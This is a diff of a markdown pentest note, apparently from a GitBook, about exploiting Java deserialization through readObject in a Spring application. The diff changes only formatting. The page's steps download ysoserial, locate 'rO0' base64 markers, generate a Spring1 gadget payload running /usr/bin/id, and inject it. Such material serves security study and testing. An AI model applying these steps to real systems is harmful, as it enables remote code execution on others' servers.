@@ -6,9 +6,9 @@
 
 A Spring application that uses serialized Java objects.
 
-The application is using the method readObject\(\) \(exposed to user input\).
+The application is using the method readObject() (exposed to user input).
 
-To be able to exploit this vulnerability, a chain of gadgets must be found \(using ysoserial\).
+To be able to exploit this vulnerability, a chain of gadgets must be found (using ysoserial).
 
 ### Exploitation
 
@@ -19,15 +19,15 @@ wget  https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-
 java -jar ysoserial-master-6eca5bc740-1.jar
 ```
 
-![](../../../../.gitbook/assets/image%20%2894%29.png)
+![](<../../../../.gitbook/assets/image (94).png>)
 
-* try to find the right payload \(try them all if enumeration fails ....\)
+* try to find the right payload (try them all if enumeration fails ....)
 
 ### Vulnerable endpoint
 
 Find where the serialized object is used. A good indicator is the string rO0, which is the base64 encoded version of \xac\xed\x00.
 
-![](../../../../.gitbook/assets/image%20%28168%29.png)
+![](<../../../../.gitbook/assets/image (168).png>)
 
 #### Payload creation
 
@@ -37,19 +37,17 @@ Find where the serialized object is used. A good indicator is the string rO0, wh
 java -jar ysoserial-master-6eca5bc740-1.jar  Spring1  "/usr/bin/id" | base64 -w 0
 ```
 
-![](../../../../.gitbook/assets/image%20%2815%29.png)
+![](<../../../../.gitbook/assets/image (15) (1).png>)
 
 * Inject the payload
 
-![](../../../../.gitbook/assets/image%20%28137%29.png)
+![](<../../../../.gitbook/assets/image (137).png>)
 
 
 
 ### Resources
 
 {% embed url="https://github.com/frohoff/ysoserial" %}
-
-
 
 
 
